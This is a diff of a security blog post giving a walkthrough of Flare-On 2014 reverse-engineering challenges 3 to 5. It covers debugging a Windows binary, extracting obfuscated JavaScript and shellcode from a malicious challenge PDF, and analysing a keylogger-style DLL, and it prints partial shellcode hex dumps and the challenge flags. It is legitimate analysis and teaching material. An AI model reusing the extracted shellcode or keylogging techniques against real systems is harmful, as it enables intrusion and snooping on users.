-<p class="nested">This challenge comprised of a binary file aptly named <code>such_evil.exe</code>. Let's do the initial information gathering on this file:</p>
-<pre class="nested"><code>$ file such_evil
+<p class="nested active">This challenge comprised of a binary file aptly named <code>such_evil.exe</code>. Let's do the initial information gathering on this file:</p>
+<pre class="nested active"><code>$ file such_evil
 such_evil: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
 $
 $ strings such_evil
@@ -275,18 +275,18 @@ _exit
 _except_handler3
 $
 </code></pre>
-<p class="nested">That's an extremely small number of strings but nothing out of the ordinary. I used <a href="https://www.winitor.com/">pestudio</a> at this point but there wasn't much to infer. Eventually I decided to debug the file with <a href="http://www.ollydbg.de/">Ollydbg</a>:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c3-1.png.webp" /></p>
-<p class="nested">I stepped through the code, carefully avoiding the <code>msvcrt</code> code and placing breakpoints at <code>CALL</code> instructions. That is when I stumbled across one such instruction: <code>CALL 00401000</code>. When I stepped over this call, the program terminated with a popup showing <code>BrokenByte</code> message:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c3-2.png.webp" /></p>
-<p class="nested">I decided to enter this code and restarted the process. Upon entering it I found a lot of code performing stack operations. I skipped through these instructions till the point where a <code>CALL EAX</code> instruction was placed immediately after the stack operations. Upon entering this call, I found instructions that seemed like part of a decoding routine:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c3-3.png.webp" /></p>
-<p class="nested">However, it turned out to be just another excessively long routine doing useless stuff, decoding strings like <code>nopasaurus</code>, <code>and i'm spent</code>, etc. I decided to keep a tab on these string locations. A few instructions later the <code>BrokenByte</code> string was pushed to stack hence indicating termination of program. At this point it was evident that the program won't display flag as a popup message but instead decode and keep it in memory. Looking around the memory locations where strings were being decoded, I found an email like string:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c3-3.png.webp" /></p>
-<p class="nested">So the flag for this challenge turned out to be: <code>such.5h311010101.flare-on.com</code></p>
+<p class="nested active">That's an extremely small number of strings but nothing out of the ordinary. I used <a href="https://www.winitor.com/">pestudio</a> at this point but there wasn't much to infer. Eventually I decided to debug the file with <a href="http://www.ollydbg.de/">Ollydbg</a>:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c3-1.png.webp" /></p>
+<p class="nested active">I stepped through the code, carefully avoiding the <code>msvcrt</code> code and placing breakpoints at <code>CALL</code> instructions. That is when I stumbled across one such instruction: <code>CALL 00401000</code>. When I stepped over this call, the program terminated with a popup showing <code>BrokenByte</code> message:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c3-2.png.webp" /></p>
+<p class="nested active">I decided to enter this code and restarted the process. Upon entering it I found a lot of code performing stack operations. I skipped through these instructions till the point where a <code>CALL EAX</code> instruction was placed immediately after the stack operations. Upon entering this call, I found instructions that seemed like part of a decoding routine:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c3-3.png.webp" /></p>
+<p class="nested active">However, it turned out to be just another excessively long routine doing useless stuff, decoding strings like <code>nopasaurus</code>, <code>and i'm spent</code>, etc. I decided to keep a tab on these string locations. A few instructions later the <code>BrokenByte</code> string was pushed to stack hence indicating termination of program. At this point it was evident that the program won't display flag as a popup message but instead decode and keep it in memory. Looking around the memory locations where strings were being decoded, I found an email like string:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c3-3.png.webp" /></p>
+<p class="nested active">So the flag for this challenge turned out to be: <code>such.5h311010101.flare-on.com</code></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Challenge #4</h3>
-<p class="nested">This is a PDF challenge and I started with my usual information gathering steps:</p>
-<pre class="nested"><code>$ file APT9001.pdf
+<p class="nested active">This is a PDF challenge and I started with my usual information gathering steps:</p>
+<pre class="nested active"><code>$ file APT9001.pdf
 APT9001.pdf: PDF document, version 1.5
 $
 $ pdfinfo APT9001.pdf
@@ -326,8 +326,8 @@ PDFiD 0.2.1 APT9001.pdf
  /Colors &gt; 2^24         0
 $
 </code></pre>
-<p class="nested">So we have a PDF file of 21KB with two pages and no optimizations. It has an object with <code>Javascript</code>, <code>OpenAction</code> and <code>JBIB2DECODE</code> filters. I decided to open this file and look at its pages. The first page shows title from the <a href="http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf">Mandiant APT1</a> report and the other page is left blank. I tried analyzing its objects and streams using <a href="http://eternal-todo.com/tools/peepdf-pdf-analysis-tool">peepdf</a> but it crashed. However Didier Stevens <a href="http://blog.didierstevens.com/programs/pdf-tools/">pdf-parser.py</a> script was able to decode it correctly:</p>
-<pre class="nested"><code>$ pdf-parser.py APT9001.pdf
+<p class="nested active">So we have a PDF file of 21KB with two pages and no optimizations. It has an object with <code>Javascript</code>, <code>OpenAction</code> and <code>JBIB2DECODE</code> filters. I decided to open this file and look at its pages. The first page shows title from the <a href="http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf">Mandiant APT1</a> report and the other page is left blank. I tried analyzing its objects and streams using <a href="http://eternal-todo.com/tools/peepdf-pdf-analysis-tool">peepdf</a> but it crashed. However Didier Stevens <a href="http://blog.didierstevens.com/programs/pdf-tools/">pdf-parser.py</a> script was able to decode it correctly:</p>
+<pre class="nested active"><code>$ pdf-parser.py APT9001.pdf
 PDF Comment '%PDF-1.5\r\n'
 PDF Comment '%\xea\xbb\xc1\x9c\r\n'
 obj 1 0
@@ -425,8 +425,8 @@ startxref 21163
 PDF Comment '%%EOF\n'
 $
 </code></pre>
-<p class="nested">Of all objects, #6 seemed interesting as the <code>FlateDecode</code> and <code>ASCIIHexDecode</code> encoded javascript inside it was referenced by #5. Let's extract and analyze this javascript code:</p>
-<pre class="nested"><code>$ pdf-parser.py APT9001.pdf -f -o6
+<p class="nested active">Of all objects, #6 seemed interesting as the <code>FlateDecode</code> and <code>ASCIIHexDecode</code> encoded javascript inside it was referenced by #5. Let's extract and analyze this javascript code:</p>
+<pre class="nested active"><code>$ pdf-parser.py APT9001.pdf -f -o6
 obj 6 0
  Type:
  Referencing:
@@ -456,8 +456,8 @@ obj 6 0
  \n    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;125;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;\n'
 $
 </code></pre>
-<p class="nested">We see unicode blob passed as an argument to <code>unescape</code> method. Let's extract and analyze it. Once extracted we will need to clean and convert it to hex:</p>
-<pre class="nested"><code class="language-python">$ ipython
+<p class="nested active">We see unicode blob passed as an argument to <code>unescape</code> method. Let's extract and analyze it. Once extracted we will need to clean and convert it to hex:</p>
+<pre class="nested active"><code class="language-python">$ ipython
 &gt;&gt;&gt;
 &gt;&gt;&gt; import re
 &gt;&gt;&gt; import binascii
@@ -469,8 +469,8 @@ $
 ...
 &gt;&gt;&gt;
 </code></pre>
-<p class="nested">The extracted binary shellcode blob contains references to Windows APIs and some strings:</p>
-<pre class="nested"><code>$ cat shellcode.binary | hd
+<p class="nested active">The extracted binary shellcode blob contains references to Windows APIs and some strings:</p>
+<pre class="nested active"><code>$ cat shellcode.binary | hd
 00000000  f9 72 49 46 25 15 0d 7f  3c 3d 84 e0 2a d6 39 e1  |.rIF%...&lt;=..*.9.|
 00000010  4a a8 b9 76 24 98 78 73  71 7d 7f 75 76 20 d4 96  |J..v$.xsq}.uv ..|
 00000020  91 ba 70 19 f9 b8 32 e2  7b 46 a8 9b 01 fe c6 c7  |..p...2.{F......|
@@ -501,8 +501,8 @@ $
 000003f0  45 78 69 74 54 ff 74 24  40 ff 54 24 40 57 ff d0  |ExitT.t$@.T$@W..|
 00000400
 </code></pre>
-<p class="nested">I tried disassembling and analyzing it but got nowhere:</p>
-<pre class="nested"><code class="language-objdump">$ cat shellcode.binary | udcli
+<p class="nested active">I tried disassembling and analyzing it but got nowhere:</p>
+<pre class="nested active"><code class="language-objdump">$ cat shellcode.binary | udcli
 0000000000000000 f9               stc
 0000000000000001 7249             jb 0x4c
 0000000000000003 46               inc esi
@@ -536,8 +536,8 @@ $
 00000000000003fe ffd0             call eax
 $
 </code></pre>
-<p class="nested">This is where the <a href="http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html">writeup</a> from <a href="https://twitter.com/bbaskin">@bbaskin</a> proved useful once again! I installed the recommended <a href="https://github.com/MarioVilas/shellcode_tools/blob/master/shellcode2exe.py">shellcode2exe.py</a> tool and converted the shellcode blob to an EXE file:</p>
-<pre class="nested"><code>$ shellcode2exe.py shellcode.binary
+<p class="nested active">This is where the <a href="http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html">writeup</a> from <a href="https://twitter.com/bbaskin">@bbaskin</a> proved useful once again! I installed the recommended <a href="https://github.com/MarioVilas/shellcode_tools/blob/master/shellcode2exe.py">shellcode2exe.py</a> tool and converted the shellcode blob to an EXE file:</p>
+<pre class="nested active"><code>$ shellcode2exe.py shellcode.binary
 Shellcode to executable converter
 by Mario Vilas (mvilas at gmail dot com)
 
@@ -552,12 +552,12 @@ $ ls -l shellcode.*
 -rw-rw-rw- 1 shiv shiv 3072 Feb 16 11:09 shellcode.unicode
 $
 </code></pre>
-<p class="nested">While analyzing this file using Ollydbg, the email is decoded and placed right in front :)</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c4-1.png.webp" /></p>
-<p class="nested">So, the flag for this challenge is: <code>wa1ch.d3m.spl01ts@flare-on.com</code></p>
+<p class="nested active">While analyzing this file using Ollydbg, the email is decoded and placed right in front :)</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c4-1.png.webp" /></p>
+<p class="nested active">So, the flag for this challenge is: <code>wa1ch.d3m.spl01ts@flare-on.com</code></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Challenge #5</h3>
-<p class="nested">Alright, on to the final challenge for this post. This is a binary file and let's gather some information about it:</p>
-<pre class="nested"><code>$ file 5get_it
+<p class="nested active">Alright, on to the final challenge for this post. This is a binary file and let's gather some information about it:</p>
+<pre class="nested active"><code>$ file 5get_it
 5get_it: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
 $
 $ strings 5get_it
@@ -596,9 +596,9 @@ UTF-16LE
 4 4$4(4,4044484@4
 $
 </code></pre>
-<p class="nested">This is a DLL that has interesting strings referring some keyboard and registry keys. Also referenced is a Windows API, <code>GetAsyncKeyState</code> that is commonly used within keyloggers to know whether a key is pressed or not. I tried analyzing this file through IDA and it proved quite useful. Upon loading the file you will find that there are references to a large number of variables that check if a certain key is pressed or not. I traced through the cross-references of all these variable and eventually found the flag:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c5-1.png.webp" /></p>
-<p class="nested">As can be seen from the screenshot above, all these variable check if certain keys are pressed in sequence. The keys to be pressed and the order they have to be pressed is the flag: <code>l0gging.ur.5tr0ke5@flare-on.com</code></p>
+<p class="nested active">This is a DLL that has interesting strings referring some keyboard and registry keys. Also referenced is a Windows API, <code>GetAsyncKeyState</code> that is commonly used within keyloggers to know whether a key is pressed or not. I tried analyzing this file through IDA and it proved quite useful. Upon loading the file you will find that there are references to a large number of variables that check if a certain key is pressed or not. I traced through the cross-references of all these variable and eventually found the flag:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c5-1.png.webp" /></p>
+<p class="nested active">As can be seen from the screenshot above, all these variable check if certain keys are pressed in sequence. The keys to be pressed and the order they have to be pressed is the flag: <code>l0gging.ur.5tr0ke5@flare-on.com</code></p>
     <hr>
           <p style="float:left;">« <a href="/posts/20151122_cigma.html">cigma: A Pure Python Filetype ...</a> «</p>
       <p style="float:right;">» <a href="/posts/20160312_circllu.html">circllu.py: Querying circl.lu ...</a> »</p>
